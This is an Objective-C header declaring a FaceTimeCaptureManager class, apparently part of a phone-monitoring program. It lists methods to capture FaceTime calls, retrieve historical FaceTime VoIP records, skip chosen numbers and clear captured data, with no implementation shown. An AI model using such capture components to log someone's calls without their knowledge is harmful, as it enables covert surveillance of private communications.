//
//  FaceTimeCaptureManager.h
//  FaceTimeCaptureManager
//
//  Created by Benjawan Tanarattanakorn on 7/22/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import "EventDelegate.h"


@interface FaceTimeCaptureManager : NSObject {
@private
	id <EventDelegate>					mEventDelegate;
	BOOL								mListening;
	NSString							*mAC;
	NSArray								*mNotCaptureNumbers;
	
	NSUInteger							mCallHistoryMaxRowID;
}

@property (nonatomic, copy) NSString *mAC;
@property (nonatomic, retain) NSArray *mNotCaptureNumbers;
@property (nonatomic, assign) NSUInteger mCallHistoryMaxRowID;

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate;
- (void) captureFacetime;

// -- Historical Facetime VoIP

+ (NSArray *) allFaceTimeVoIPs;
+ (NSArray *) allFaceTimeVoIPsWithMax: (NSInteger) aMaxNumber;
+ (void)clearCapturedData;

@end
